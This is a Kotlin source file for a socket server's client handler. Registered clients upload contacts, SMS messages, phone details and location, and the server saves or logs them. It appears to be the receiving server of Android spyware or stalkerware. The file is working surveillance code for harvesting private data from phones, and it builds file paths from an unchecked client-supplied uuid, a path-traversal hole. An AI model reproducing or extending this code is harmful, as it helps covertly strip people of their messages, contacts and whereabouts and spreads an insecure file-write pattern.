package server

import helper.Logger
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.*

class ClientThread(private val parent: WeakReference<ServerThread>, private val client: Socket): Runnable {

    private val tag = "ClientThread"
    private val dataDivider = ":|:"

    override fun run() {
        Logger.log(tag, "Client connected: ${client.remoteSocketAddress}")
        while (client.isConnected) {
            val output = client.getOutputStream()
            val input = client.getInputStream().bufferedReader()

            while (true) {
                val line = input.readLine().split(dataDivider)

                when (line[0]) {
                    "connect" -> {
                        var uuid = line.getOrElse(1) { "" }
                        val token = line.getOrElse(2) { "" }

                        if (token.isBlank()) {
                            output.write("error${dataDivider}Token required\n".toByteArray())
                            continue
                        }

                        uuid = uuid.ifBlank { UUID.randomUUID().toString() }

                        parent.get()?.clients?.set(uuid, Client(uuid, token))

                        Logger.log(
                            tag,
                            "connect satisfied from ${client.remoteSocketAddress}, dedicated uuid: $uuid"
                        )
                        output.write("ok${dataDivider}$uuid\n".toByteArray())

                        parent.get()?.listeners?.forEach { it.onClientsListChanged(
                            parent.get()?.clients?.values?.toList() ?: emptyList()
                        )
                        }
                    }

                    "contacts" -> {
                        val uuid = line.getOrElse(1) { "" }
                        val contacts = line.getOrElse(2) { "" }

                        if (uuid.isBlank()) {
                            output.write("error${dataDivider}uuid required\n".toByteArray())
                            continue
                        }

                        var fullContacts = contacts
                        while (input.ready()) {
                            fullContacts += "${input.readLine()}\n"
                        }

                        val formatter = SimpleDateFormat("yyyy.MM.dd HH:mm:ss")
                        val fileName = "./contacts/${uuid}_${formatter.format(Date().time)}.txt"
                        val fileStream = FileOutputStream(fileName)
                        fileStream.write(fullContacts.toByteArray())
                        fileStream.close()

                        Logger.log(
                            tag,
                            "Received contacts from $uuid. Saved to $fileName"
                        )
                        output.write("ok\n".toByteArray())
                    }

                    "phone_info" -> {
                        val uuid = line.getOrElse(1) { "" }
                        val phoneInfo = line.getOrElse(2) { "" }

                        if (uuid.isBlank()) {
                            output.write("error${dataDivider}uuid required\n".toByteArray())
                            continue
                        }

                        var fullInfo = phoneInfo
                        while (input.ready()) {
                            fullInfo += "${input.readLine()}\n"
                        }

                        Logger.log(
                            tag,
                            "phone info received from $uuid: $fullInfo"
                        )

                        output.write("ok\n".toByteArray())
                    }

                    "sms" -> {
                        val uuid = line.getOrElse(1)  { "" }
                        val sms = line.getOrElse(2) { "" }

                        if (uuid.isBlank()) {
                            output.write("error${dataDivider}uuid required\n".toByteArray())
                            continue
                        }

                        var fullSms = sms
                        while (input.ready()) { fullSms += "${input.readLine()}\n" }

                        val formatter = SimpleDateFormat("yyyy.MM.dd HH:mm:ss")
                        val fileName = "./sms/${uuid}_${formatter.format(Date().time)}.txt"
                        val fileStream = FileOutputStream(fileName)
                        fileStream.write(fullSms.toByteArray())
                        fileStream.close()

                        Logger.log(tag, "Received SMS from $uuid. Saved to $fileName")

                        output.write("ok\n".toByteArray())
                    }

                    "location" -> {
                        val uuid = line.getOrElse(1) { "" }
                        val location = line.getOrElse(2) { "" }

                        if (uuid.isBlank()) {
                            output.write("error${dataDivider}uuid required\n".toByteArray())
                            continue
                        }

                        Logger.log(
                            tag,
                            "location received from ${uuid}: $location"
                        )

                        output.write("ok\n".toByteArray())
                    }
                }
            }
        }
        Logger.log(tag, "Client disconnected: ${client.remoteSocketAddress}")
    }
}